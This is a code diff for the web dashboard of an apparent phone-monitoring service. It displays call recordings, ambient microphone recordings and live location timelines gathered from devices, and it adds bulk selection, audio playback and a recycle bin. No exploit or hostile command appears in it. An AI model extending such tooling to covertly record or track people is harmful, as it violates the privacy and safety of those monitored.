-            const dirBg  = isIn ? '#0d3b26' : '#1a1f3a';
-            const dirCol = isIn ? 'var(--green)' : 'var(--primary)';
-            const dirLbl = isIn ? '📲 Incoming' : '📤 Outgoing';
-            const who    = r.contact_name
+            var isIn   = r.direction === 'incoming';
+            var dirBg  = isIn ? '#0d3b26' : '#1a1f3a';
+            var dirCol = isIn ? 'var(--green)' : 'var(--primary)';
+            var dirLbl = isIn ? '📲 Incoming' : '📤 Outgoing';
+            var who    = r.contact_name
                 ? `<strong>${esc(r.contact_name)}</strong> <span style="color:var(--muted);font-size:11px;">${esc(r.phone_number || '')}</span>`
                 : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
-            const audioSection = (r.audio_url || r.audio_data)
-                ? `<audio controls style="width:100%;margin-top:8px;height:32px;" src="${esc(r.audio_url || r.audio_data)}"></audio>`
-                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">🔇 Audio not available</div>`;
-            const did = esc(r._device_id);
-            const rid = esc(r._rec_id);
+            var hasAudio = !!(r.audio_url || r.audio_data);
+            var audioSrc = esc(r.audio_url || r.audio_data || '');
+            var recKey   = r._device_id + '|||' + r._rec_id;
+            var did = esc(r._device_id), rid = esc(r._rec_id);
 
-            return `<div class="rec-card">
+            var audioSection = hasAudio
+                ? `<div class="rec-waveform-wrap">
+                    <canvas class="rec-waveform-canvas" id="recWave-${rid}"></canvas>
+                    <div class="rec-play-overlay">
+                        <button class="rec-play-btn" id="recPlayBtn-${rid}" title="Play/Pause">▶</button>
+                        <div class="rec-progress-bar">
+                            <div class="rec-progress-fill" id="recProg-${rid}"></div>
+                        </div>
+                        <span class="rec-time-label" id="recTime-${rid}">0:00</span>
+                    </div>
+                </div>`
+                : `<div style="font-size:11px;color:var(--muted);margin-top:6px;">🔇 Audio not available</div>`;
+
+            return `<div class="rec-card" id="recCard-${rid}" data-reckey="${recKey}">
                 <div style="display:flex;align-items:flex-start;gap:12px;">
+                    <label style="cursor:pointer;margin-top:10px;" onclick="event.stopPropagation()">
+                        <input type="checkbox" class="rec-checkbox" data-did="${did}" data-rid="${rid}"
+                            style="accent-color:var(--primary);width:15px;height:15px;">
+                    </label>
                     <div style="width:36px;height:36px;border-radius:50%;background:${dirBg};display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">${isIn ? '📲' : '📤'}</div>
                     <div style="flex:1;min-width:0;">
                         <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:4px;">
@@ -4122,10 +4558,34 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                         <div style="font-size:13px;margin-bottom:2px;">${who}</div>
                         ${audioSection}
                     </div>
-                    <button class="btn btn-red btn-sm" style="flex-shrink:0;margin-left:8px;" onclick="window.__appDeleteRecording('${did}','${rid}')" title="Delete recording">🗑️ Delete</button>
+                    <button class="btn btn-red btn-sm" style="flex-shrink:0;margin-left:8px;" onclick="window.__appDeleteRecording('${did}','${rid}')" title="Delete recording">🗑️</button>
                 </div>
             </div>`;
         }).join('');
+
+        // Attach audio player logic after DOM render
+        recs.forEach(r => {
+            var hasAudio = !!(r.audio_url || r.audio_data);
+            if (hasAudio) {
+                attachAudioPlayer(r._rec_id, r.audio_url || r.audio_data);
+            }
+        });
+
+        // Attach checkbox listeners
+        container.querySelectorAll('.rec-checkbox').forEach(cb => {
+            cb.addEventListener('change', function () {
+                var key = cb.dataset.did + '|||' + cb.dataset.rid;
+                var card = document.getElementById('recCard-' + cb.dataset.rid);
+                if (cb.checked) {
+                    selectedRecIds.add(key);
+                    if (card) card.classList.add('rec-selected');
+                } else {
+                    selectedRecIds.delete(key);
+                    if (card) card.classList.remove('rec-selected');
+                }
+                updateRecBulkBar();
+            });
+        });
     }
 
     // ── Open phone recordings ───────────────────────────────────────────────
@@ -4291,34 +4751,49 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
     // ── App Bin rendering ───────────────────────────────────────────────────
     window.__appBinSwitchTab = function (tab) {
         appCurrentBinTab = tab;
-        document.getElementById('appBinTabRec').classList.toggle('active', tab === 'recordings');
-        document.getElementById('appBinTabDev').classList.toggle('active', tab === 'devices');
+        ['appBinTabCallRec','appBinTabAmbRec','appBinTabLoc','appBinTabDev'].forEach(id => {
+            const el = document.getElementById(id);
+            if (el) el.classList.remove('active');
+        });
+        const tabMap = {
+            'call-recordings': 'appBinTabCallRec',
+            'recordings': 'appBinTabAmbRec',
+            'locations': 'appBinTabLoc',
+            'devices': 'appBinTabDev'
+        };
+        const activeId = tabMap[tab];
+        if (activeId) { const el = document.getElementById(activeId); if (el) el.classList.add('active'); }
         renderAppBin();
     };
 
     function renderAppBin() {
-        renderBinRecordings();
+        renderBinCallRecordings();
+        renderBinAmbRecordings();
+        renderBinLocations();
         renderBinDevices();
         updateNavBadge();
     }
 
-    function renderBinRecordings() {
+    function renderBinCallRecordings() {
         const container = document.getElementById('appBinRecordingsList');
         const emptyMsg  = document.getElementById('appBinRecEmptyMsg');
         if (!container) return;
 
-        const show = appCurrentBinTab === 'recordings';
+        const show = appCurrentBinTab === 'call-recordings';
         container.style.display = show ? '' : 'none';
+        if (!show) { if (emptyMsg) emptyMsg.style.display = 'none'; return; }
 
-        if (!show) { emptyMsg.style.display = 'none'; return; }
+        // Only call recordings (direction != ambient)
+        const recs = allDeletedRecordings().filter(r => r.direction !== 'ambient');
+        const badge = document.getElementById('appBinRecCount');
+        if (badge) badge.textContent = recs.length > 0 ? '(' + recs.length + ')' : '';
 
-        const recs = allDeletedRecordings();
         if (recs.length === 0) {
             container.innerHTML = '';
-            emptyMsg.style.display = '';
+            if (emptyMsg) emptyMsg.style.display = '';
             return;
         }
-        emptyMsg.style.display = 'none';
+        if (emptyMsg) emptyMsg.style.display = 'none';
 
         container.innerHTML = recs.map(r => {
             const isIn   = r.direction === 'incoming';
@@ -4328,7 +4803,6 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             const who    = r.contact_name
                 ? `<strong>${esc(r.contact_name)}</strong> <span style="color:var(--muted);font-size:11px;">${esc(r.phone_number || '')}</span>`
                 : `<strong>${esc(r.phone_number || 'Unknown number')}</strong>`;
-            // Device info for context
             const dev    = appDevicesData[r._device_id] || {};
             const devLabel = dev.custom_name || dev.model || r._device_id;
             const did = esc(r._device_id), rid = esc(r._rec_id);
@@ -4355,6 +4829,115 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
         }).join('');
     }
 
+    function renderBinAmbRecordings() {
+        const container = document.getElementById('appBinAmbList');
+        const emptyMsg  = document.getElementById('appBinAmbEmptyMsg');
+        if (!container) return;
+
+        const show = appCurrentBinTab === 'recordings';
+        container.style.display = show ? '' : 'none';
+        if (!show) { if (emptyMsg) emptyMsg.style.display = 'none'; return; }
+
+        const recs = allDeletedRecordings().filter(r => r.direction === 'ambient');
+        const badge = document.getElementById('appBinAmbCount');
+        if (badge) badge.textContent = recs.length > 0 ? '(' + recs.length + ')' : '';
+
+        if (recs.length === 0) {
+            container.innerHTML = '';
+            if (emptyMsg) emptyMsg.style.display = '';
+            return;
+        }
+        if (emptyMsg) emptyMsg.style.display = 'none';
+
+        container.innerHTML = recs.map(r => {
+            const dev      = appDevicesData[r._device_id] || {};
+            const devLabel = dev.custom_name || dev.model || r._device_id;
+            const did = esc(r._device_id), rid = esc(r._rec_id);
+            return `<div class="rec-card rec-card-deleted">
+                <div style="display:flex;align-items:flex-start;gap:12px;flex-wrap:wrap;">
+                    <div style="width:36px;height:36px;border-radius:50%;background:rgba(139,92,246,.2);display:flex;align-items:center;justify-content:center;font-size:14px;flex-shrink:0;">🎧</div>
+                    <div style="flex:1;min-width:160px;">
+                        <div style="font-weight:700;font-size:13px;margin-bottom:3px;">Ambient Chunk</div>
+                        <div style="font-size:12px;color:var(--muted);">${fmtDateTime(r.start_time)} · ⏱ ${fmtDuration(r.duration_seconds)}</div>
+                        <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
+                        <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(r.deleted_at)}</div>
+                    </div>
+                    <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
+                        <button class="btn btn-green btn-sm" onclick="window.__appRestoreRecording('${did}','${rid}')">♻️ Restore</button>
+                        <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteRecording('${did}','${rid}')">🔥 Delete</button>
+                    </div>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    function renderBinLocations() {
+        const container = document.getElementById('appBinLocList');
+        const emptyMsg  = document.getElementById('appBinLocEmptyMsg');
+        if (!container) return;
+
+        const show = appCurrentBinTab === 'locations';
+        container.style.display = show ? '' : 'none';
+        if (!show) { if (emptyMsg) emptyMsg.style.display = 'none'; return; }
+
+        // Collect all deleted location stays across all devices
+        const locItems = [];
+        Object.keys(appRecordingsData).forEach(deviceId => {
+            const tlData = window.__tlDeletedStays ? window.__tlDeletedStays[deviceId] : null;
+            if (!tlData) return;
+            Object.entries(tlData).forEach(([stayId, stay]) => {
+                if (stay.deleted_at) locItems.push({ ...stay, _device_id: deviceId, _stay_id: stayId });
+            });
+        });
+        locItems.sort((a, b) => (b.deleted_at || 0) - (a.deleted_at || 0));
+
+        const badge = document.getElementById('appBinLocCount');
+        if (badge) badge.textContent = locItems.length > 0 ? '(' + locItems.length + ')' : '';
+
+        if (locItems.length === 0) {
+            container.innerHTML = '';
+            if (emptyMsg) emptyMsg.style.display = '';
+            return;
+        }
+        if (emptyMsg) emptyMsg.style.display = 'none';
+
+        container.innerHTML = locItems.map(loc => {
+            const dev      = appDevicesData[loc._device_id] || {};
+            const devLabel = dev.custom_name || dev.model || loc._device_id;
+            const did = esc(loc._device_id), sid = esc(loc._stay_id);
+            const lat = parseFloat(loc.latitude), lng = parseFloat(loc.longitude);
+            const coords = (!isNaN(lat) && !isNaN(lng)) ? lat.toFixed(5) + ', ' + lng.toFixed(5) : 'No coords';
+            return `<div class="loc-bin-card">
+                <div class="loc-bin-icon">📍</div>
+                <div style="flex:1;min-width:140px;">
+                    <div style="font-weight:700;font-size:13px;margin-bottom:3px;">Location Stay</div>
+                    <div style="font-size:12px;color:var(--muted);">${esc(coords)}</div>
+                    <div style="font-size:11px;color:var(--muted);">📱 From: ${esc(devLabel)}</div>
+                    <div style="font-size:11px;color:var(--red);margin-top:3px;">🗑️ Deleted: ${fmtTs(loc.deleted_at)}</div>
+                </div>
+                <div style="display:flex;gap:6px;flex-wrap:wrap;align-self:center;">
+                    <button class="btn btn-green btn-sm" onclick="window.__appRestoreLocation('${did}','${sid}')">♻️ Restore</button>
+                    <button class="btn btn-red btn-sm"   onclick="window.__appPermDeleteLocation('${did}','${sid}')">🔥 Delete</button>
+                </div>
+            </div>`;
+        }).join('');
+    }
+
+    // Restore / perm-delete location stays
+    window.__appRestoreLocation = async function (deviceId, stayId) {
+        try {
+            await update(ref(db, 'device_timeline/' + deviceId + '/' + stayId), { deleted_at: null });
+            toast('✅ Location stay restored.', 'var(--green)');
+        } catch (e) { toast('❌ Restore failed: ' + e.message, 'var(--red)'); }
+    };
+    window.__appPermDeleteLocation = async function (deviceId, stayId) {
+        if (!confirm('Permanently delete this location stay?')) return;
+        try {
+            await remove(ref(db, 'device_timeline/' + deviceId + '/' + stayId));
+            toast('🔥 Location permanently deleted.', 'var(--red)');
+        } catch (e) { toast('❌ Delete failed: ' + e.message, 'var(--red)'); }
+    };
+
     function renderBinDevices() {
         const container = document.getElementById('appBinDevicesList');
         const emptyMsg  = document.getElementById('appBinDevEmptyMsg');
@@ -4362,8 +4945,7 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
         const show = appCurrentBinTab === 'devices';
         container.style.display = show ? '' : 'none';
-
-        if (!show) { emptyMsg.style.display = 'none'; return; }
+        if (!show) { if (emptyMsg) emptyMsg.style.display = 'none'; return; }
 
         const devices = deletedDevices();
         if (devices.length === 0) {
@@ -4453,10 +5035,8 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
     document.querySelectorAll('[data-panel="app-bin"][data-shell="admin"]').forEach(el => {
         el.addEventListener('click', () => {
             attachAppListeners();
-            appCurrentBinTab = 'recordings';
-            document.getElementById('appBinTabRec').classList.add('active');
-            document.getElementById('appBinTabDev').classList.remove('active');
-            renderAppBin();
+            appCurrentBinTab = 'call-recordings';
+            window.__appBinSwitchTab('call-recordings');
         });
     });
 
@@ -5129,53 +5709,277 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             return card;
         }
 
+        // ─────────────────────────────────────────────────────────────────────
+        // FULL RENDER — newest entries at top, grouped by day
+        // ─────────────────────────────────────────────────────────────────────
+
+        var tlSelectedStays = new Set();
+
+        function tlUpdateSelectBar() {
+            var bar   = document.getElementById('tlSelectBar');
+            var label = document.getElementById('tlSelectLabel');
+            if (!bar || !label) return;
+            if (tlSelectedStays.size > 0) {
+                bar.classList.add('active');
+                label.textContent = tlSelectedStays.size + ' location' + (tlSelectedStays.size !== 1 ? 's' : '') + ' selected';
+            } else {
+                bar.classList.remove('active');
+            }
+        }
+
+        // Bulk delete selected locations → soft-delete, move to App Bin Locations
+        var tlBulkDeleteBtn = document.getElementById('tlBulkDeleteBtn');
+        var tlBulkCancelBtn = document.getElementById('tlBulkCancelBtn');
+        if (tlBulkDeleteBtn) {
+            tlBulkDeleteBtn.addEventListener('click', async function () {
+                if (tlSelectedStays.size === 0) return;
+                var currentDeviceId = window.__appCurrentDevice || null;
+                if (!currentDeviceId) return;
+                if (!confirm('Delete ' + tlSelectedStays.size + ' location(s)? They will be moved to App Bin.')) return;
+                var now = Date.now();
+                var updates = {};
+                tlSelectedStays.forEach(function (stayId) {
+                    updates['device_timeline/' + currentDeviceId + '/' + stayId + '/deleted_at'] = now;
+                });
+                try {
+                    await update(ref(db), updates);
+                    toast('🗑️ ' + tlSelectedStays.size + ' location(s) moved to App Bin.', 'var(--yellow)');
+                    pushNotif('📍', tlSelectedStays.size + ' location(s) deleted', 'Device Timeline');
+                } catch(e) { toast('❌ Delete failed: ' + e.message, 'var(--red)'); }
+                tlSelectedStays.clear();
+                tlUpdateSelectBar();
+            });
+        }
+        if (tlBulkCancelBtn) {
+            tlBulkCancelBtn.addEventListener('click', function () {
+                tlSelectedStays.clear();
+                document.querySelectorAll('.tl-stay-cb').forEach(cb => cb.checked = false);
+                tlUpdateSelectBar();
+            });
+        }
+
+        // ── Card select checkbox handler (delegated) ────────────────────────
+        var appTlCardList = document.getElementById('appTlCardList');
+        if (appTlCardList) {
+            appTlCardList.addEventListener('change', function (e) {
+                var cb = e.target.closest('.tl-stay-cb');
+                if (!cb) return;
+                if (cb.checked) tlSelectedStays.add(cb.dataset.stayId);
+                else tlSelectedStays.delete(cb.dataset.stayId);
+                tlUpdateSelectBar();
+            });
+        }
+
+        function tlBuildCardBodyHTML(stay, num, isCurrent) {
+            var startLabel = tlFmtTime(stay.startTime);
+            var endLabel   = isCurrent
+                ? '<span style="color:var(--green);font-weight:700;">Now</span>'
+                : tlFmtTime(stay.endTime);
+            var durLabel   = tlFmtDuration(tlCalcDuration(stay));
+            var lat = parseFloat(stay.latitude);
+            var lng = parseFloat(stay.longitude);
+            var coordText  = (!isNaN(lat) && !isNaN(lng))
+                ? lat.toFixed(5) + ', ' + lng.toFixed(5)
+                : 'No coordinates';
+            var dateLabel  = tlFmtDate(stay.startTime);
+
+            var hereBadge = isCurrent
+                ? '<div class="dtl-here-badge"><span class="dtl-here-dot"></span> Currently Here</div>'
+                : '';
+
+            return hereBadge +
+                '<div class="dtl-card-time">' +
+                    '\uD83D\uDD52 ' + startLabel +
+                    ' <span class="dtl-arrow">\u2192</span> ' + endLabel +
+                '</div>' +
+                '<div class="dtl-card-duration">' +
+                    '\u23F1 Stayed for <strong style="color:var(--text);margin-left:4px;">' + durLabel + '</strong>' +
+                    '<span style="margin-left:10px;font-size:11px;color:var(--muted);">' + dateLabel + '</span>' +
+                '</div>' +
+                '<div class="dtl-card-coords">\uD83D\uDCCD ' + coordText + '</div>' +
+                '<div class="dtl-maps-hint">\uD83D\uDDFA Open in Google Maps \u2192</div>';
+        }
+
+        function tlCreateCard(stayId, stay, num, isCurrent) {
+            var lat = parseFloat(stay.latitude);
+            var lng = parseFloat(stay.longitude);
+            var hasCoords = !isNaN(lat) && !isNaN(lng);
+
+            var card = document.createElement('div');
+            card.className = 'dtl-card' + (isCurrent ? ' dtl-current' : '');
+            card.dataset.stayId = stayId;
+            card.style.position = 'relative';
+
+            // Checkbox for multi-select (top-right of card)
+            var cbWrap = document.createElement('label');
+            cbWrap.style.cssText = 'position:absolute;top:8px;right:8px;cursor:pointer;z-index:2;';
+            cbWrap.innerHTML = '<input type="checkbox" class="tl-stay-cb" data-stay-id="' + stayId + '" style="accent-color:var(--primary);width:14px;height:14px;">';
+            cbWrap.addEventListener('click', function (e) { e.stopPropagation(); });
+
+            var bullet = document.createElement('div');
+            bullet.className = 'dtl-bullet';
+            if (isCurrent) {
+                bullet.innerHTML = '<span style="font-size:17px;">&#128205;</span>';
+                bullet.style.cssText = 'background:var(--green);border-color:var(--green);color:#fff;';
+            } else {
+                bullet.textContent = String(num);
+            }
+
+            var body = document.createElement('div');
+            body.className = 'dtl-card-body';
+            body.innerHTML = tlBuildCardBodyHTML(stay, num, isCurrent);
+
+            card.appendChild(cbWrap);
+            card.appendChild(bullet);
+            card.appendChild(body);
+
+            // Click → open Google Maps (but not when clicking checkbox)
+            if (hasCoords) {
+                card.title = 'Open in Google Maps';
+                card.addEventListener('click', function (e) {
+                    if (e.target.closest('.tl-stay-cb') || e.target.type === 'checkbox') return;
+                    window.open(
+                        'https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lng,
+                        '_blank'
+                    );
+                });
+            }
+            return card;
+        }
+
         function tlFlash(bodyEl) {
             bodyEl.classList.remove('dtl-updated');
-            void bodyEl.offsetWidth; // force reflow so animation restarts
+            void bodyEl.offsetWidth;
             bodyEl.classList.add('dtl-updated');
         }
 
         // ─────────────────────────────────────────────────────────────────────
-        // FULL RENDER (called on first load or structural change)
+        // GROUP stays by DAY for display
+        // Today → show LIVE at top (no collapsible tab)
+        // Past days → collapsible tabs, newest day first
         // ─────────────────────────────────────────────────────────────────────
+
+        function tlDateKey(val) {
+            if (!val) return 'unknown';
+            var d = typeof val === 'number' ? new Date(val) : new Date(val);
+            if (isNaN(d.getTime())) return 'unknown';
+            return d.getFullYear() + '-' + String(d.getMonth()+1).padStart(2,'0') + '-' + String(d.getDate()).padStart(2,'0');
+        }
+
+        function tlBuildDayGroups(sorted) {
+            var todayKey = tlDateKey(Date.now());
+            var groups   = {};
+            sorted.forEach(function (item) {
+                if (item.data.deleted_at) return; // skip soft-deleted
+                var dk = tlDateKey(item.data.startTime);
+                if (!groups[dk]) groups[dk] = { dateKey: dk, items: [], isToday: dk === todayKey };
+                groups[dk].items.push(item);
+            });
+            // Within each day: newest first
+            Object.values(groups).forEach(function (g) {
+                g.items.sort(function (a, b) {
+                    var tA = typeof a.data.startTime === 'number' ? a.data.startTime : new Date(a.data.startTime||0).getTime();
+                    var tB = typeof b.data.startTime === 'number' ? b.data.startTime : new Date(b.data.startTime||0).getTime();
+                    return tB - tA; // newest first within day
+                });
+            });
+            // Return array: today first, then past days newest-first
+            return Object.values(groups).sort(function (a, b) {
+                if (a.isToday) return -1;
+                if (b.isToday) return 1;
+                return b.dateKey.localeCompare(a.dateKey);
+            });
+        }
 
         function tlRenderAll(sorted) {
             var list = document.getElementById('appTlCardList');
             if (!list) return;
             list.innerHTML = '';
             tlStayMap.clear();
+            tlSelectedStays.clear();
+            tlUpdateSelectBar();
 
-            if (!sorted.length) {
+            // Filter deleted entries
+            var active = sorted.filter(function (s) { return !s.data.deleted_at; });
+
+            if (!active.length) {
                 tlSetState('empty');
                 tlUpdateSummary([]);
                 return;
             }
             tlSetState('list');
 
-            sorted.forEach(function (item, idx) {
-                var stayId    = item.stayId;
-                var data      = item.data;
-                var isLatest  = idx === sorted.length - 1;
-                var isCurrent = tlIsCurrent(data, isLatest);
-                var cardEl    = tlCreateCard(stayId, data, idx + 1, isCurrent);
-                list.appendChild(cardEl);
-                tlStayMap.set(stayId, { data: data, cardEl: cardEl });
+            var dayGroups = tlBuildDayGroups(active);
+
+            dayGroups.forEach(function (group) {
+                if (group.isToday) {
+                    // LIVE today section
+                    var liveHeader = document.createElement('div');
+                    liveHeader.className = 'tl-live-header';
+                    liveHeader.innerHTML = '<span style="animation:pulse 2s infinite;display:inline-block;width:8px;height:8px;background:var(--green);border-radius:50%;margin-right:4px;"></span> Today — Live Updates';
+                    list.appendChild(liveHeader);
+                    group.items.forEach(function (item, idx) {
+                        var globalIdx  = active.findIndex(function (s) { return s.stayId === item.stayId; });
+                        var isFirst    = idx === 0; // newest = first = potentially current
+                        var isCurrent  = isFirst && (!item.data.endTime || item.data.endTime === '');
+                        var displayNum = active.length - active.findIndex(function (s) { return s.stayId === item.stayId; });
+                        var cardEl = tlCreateCard(item.stayId, item.data, displayNum, isCurrent);
+                        list.appendChild(cardEl);
+                        tlStayMap.set(item.stayId, { data: item.data, cardEl: cardEl });
+                    });
+                } else {
+                    // Past day — collapsible
+                    var dayGroup = document.createElement('div');
+                    dayGroup.className = 'tl-day-group';
+                    dayGroup.dataset.dayKey = group.dateKey;
+
+                    var d        = new Date(group.dateKey);
+                    var dayLabel = d.toLocaleDateString([], { weekday:'long', month:'short', day:'numeric', year:'numeric' });
+
+                    var header = document.createElement('div');
+                    header.className = 'tl-day-header';
+                    header.innerHTML =
+                        '<span class="tl-day-icon">📅</span>' +
+                        '<span class="tl-day-title">' + dayLabel + '</span>' +
+                        '<span class="tl-day-meta">' + group.items.length + ' stop' + (group.items.length!==1?'s':'') + '</span>' +
+                        '<span class="tl-day-chevron">▶</span>';
+                    header.addEventListener('click', function () {
+                        dayGroup.classList.toggle('open');
+                    });
+
+                    var entries = document.createElement('div');
+                    entries.className = 'tl-day-entries';
+
+                    group.items.forEach(function (item, idx) {
+                        var displayNum = group.items.length - idx;
+                        var isCurrent  = false; // past days are never "currently here"
+                        var cardEl     = tlCreateCard(item.stayId, item.data, displayNum, isCurrent);
+                        entries.appendChild(cardEl);
+                        tlStayMap.set(item.stayId, { data: item.data, cardEl: cardEl });
+                    });
+
+                    dayGroup.appendChild(header);
+                    dayGroup.appendChild(entries);
+                    list.appendChild(dayGroup);
+                }
             });
 
-            tlUpdateSummary(sorted.map(function (s) { return s.data; }));
+            tlUpdateSummary(active.map(function (s) { return s.data; }));
         }
 
         // ─────────────────────────────────────────────────────────────────────
-        // PATCH ONE CARD IN-PLACE (no flicker, no duplication)
+        // PATCH ONE CARD IN-PLACE
         // ─────────────────────────────────────────────────────────────────────
 
         function tlPatchCard(stayId, data, sorted) {
             var entry = tlStayMap.get(stayId);
             if (!entry) { tlRenderAll(sorted); return; }
 
-            var idx       = sorted.findIndex(function (s) { return s.stayId === stayId; });
-            var isLatest  = idx === sorted.length - 1;
-            var isCurrent = tlIsCurrent(data, isLatest);
+            var active    = sorted.filter(function (s) { return !s.data.deleted_at; });
+            var idx       = active.findIndex(function (s) { return s.stayId === stayId; });
+            var isFirst   = idx === 0;
+            var isCurrent = isFirst && (!data.endTime || data.endTime === '');
+            var displayNum = active.length - idx;
 
             var cardEl = entry.cardEl;
             var bullet = cardEl.querySelector('.dtl-bullet');
@@ -5188,26 +5992,26 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     bullet.innerHTML = '<span style="font-size:17px;">&#128205;</span>';
                     bullet.style.cssText = 'background:var(--green);border-color:var(--green);color:#fff;';
                 } else {
-                    bullet.textContent = String(idx + 1);
+                    bullet.textContent = String(displayNum);
                     bullet.style.cssText = '';
                 }
             }
 
             if (body) {
-                body.innerHTML = tlBuildCardBodyHTML(data, idx + 1, isCurrent);
-                if (!isCurrent) tlFlash(body); // skip flash for current (green) card
+                body.innerHTML = tlBuildCardBodyHTML(data, displayNum, isCurrent);
+                if (!isCurrent) tlFlash(body);
             }
 
-            // Refresh click handler
             var lat = parseFloat(data.latitude);
             var lng = parseFloat(data.longitude);
             if (!isNaN(lat) && !isNaN(lng)) {
-                cardEl.onclick = function () {
+                cardEl.onclick = function (e) {
+                    if (e.target.closest('.tl-stay-cb') || e.target.type === 'checkbox') return;
                     window.open('https://www.google.com/maps/search/?api=1&query=' + lat + ',' + lng, '_blank');
                 };
             }
             entry.data = data;
-            tlUpdateSummary(sorted.map(function (s) { return s.data; }));
+            tlUpdateSummary(active.map(function (s) { return s.data; }));
         }
 
         // ─────────────────────────────────────────────────────────────────────
@@ -5261,17 +6065,24 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
             dataArr.forEach(function (d) { var s = tlCalcDuration(d); if (s != null) totalSecs += s; });
             set('appTlChipTotal', tlFmtDuration(totalSecs));
 
-            var last = dataArr[dataArr.length - 1];
-            set('appTlChipLastTime', tlFmtDate(last.startTime) + ' \u00B7 ' + tlFmtTime(last.startTime));
+            // Last activity = most recent entry (first after sort newest-first)
+            var newest = dataArr.slice().sort(function (a, b) {
+                var tA = typeof a.startTime === 'number' ? a.startTime : new Date(a.startTime||0).getTime();
+                var tB = typeof b.startTime === 'number' ? b.startTime : new Date(b.startTime||0).getTime();
+                return tB - tA;
+            })[0];
+            set('appTlChipLastTime', newest ? tlFmtDate(newest.startTime) + ' \u00B7 ' + tlFmtTime(newest.startTime) : '—');
 
             var liveBadge = document.getElementById('appTlLiveBadge');
             if (liveBadge) {
-                liveBadge.style.display = (!last.endTime || last.endTime === '') ? '' : 'none';
+                // Show LIVE if any entry has no end time
+                var anyLive = dataArr.some(function (d) { return !d.endTime || d.endTime === ''; });
+                liveBadge.style.display = anyLive ? '' : 'none';
             }
         }
 
         // ─────────────────────────────────────────────────────────────────────
-        // SORT: stays ascending by startTime
+        // SORT: stays newest-first
         // ─────────────────────────────────────────────────────────────────────
 
         function tlSort(rawObj) {
@@ -5280,21 +6091,21 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                 .sort(function (a, b) {
                     var tA = a.data.startTime, tB = b.data.startTime;
                     if (!tA && !tB) return 0;
-                    if (!tA) return -1;
-                    if (!tB) return 1;
+                    if (!tA) return 1;
+                    if (!tB) return -1;
                     var nA = typeof tA === 'number' ? tA : new Date(tA).getTime();
                     var nB = typeof tB === 'number' ? tB : new Date(tB).getTime();
-                    return nA - nB;
+                    return nB - nA; // newest first
                 });
         }
 
         // ─────────────────────────────────────────────────────────────────────
         // FIREBASE REAL-TIME LISTENER
-        // Reads device_timeline/{deviceId}, updates UI reactively.
         // ─────────────────────────────────────────────────────────────────────
 
         function tlOpenForDevice(deviceId) {
-            window.__appTlCleanup(); // detach previous listener
+            window.__appTlCleanup();
+            window.__appCurrentDevice = deviceId;
 
             if (!deviceId) { tlSetState('empty'); return; }
             tlSetState('loading');
@@ -5312,7 +6123,8 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
                     }
 
                     var sorted = tlSort(raw);
-                    var newIds = new Set(sorted.map(function (s) { return s.stayId; }));
+                    var active = sorted.filter(function (s) { return !s.data.deleted_at; });
+                    var newIds = new Set(active.map(function (s) { return s.stayId; }));
                     var oldIds = new Set(tlStayMap.keys());
 
                     // Structural change → full re-render
@@ -5322,16 +6134,9 @@ document.querySelectorAll('[data-panel][data-shell]').forEach(el => {
 
                     if (structural) {
                         tlRenderAll(sorted);
-                        // Auto-scroll to newest card
-                        var list = document.getElementById('appTlCardList');
-                        if (list && list.lastElementChild) {
-                            setTimeout(function () {
-                                list.lastElementChild.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-                            }, 80);
-                        }
                     } else {
-                        // Only data changed → patch each changed card in-place
                         sorted.forEach(function (item) {
+                            if (item.data.deleted_at) return;
                             var existing = tlStayMap.get(item.stayId);
                             var changed = !existing
                                 || existing.data.endTime         !== item.data.endTime
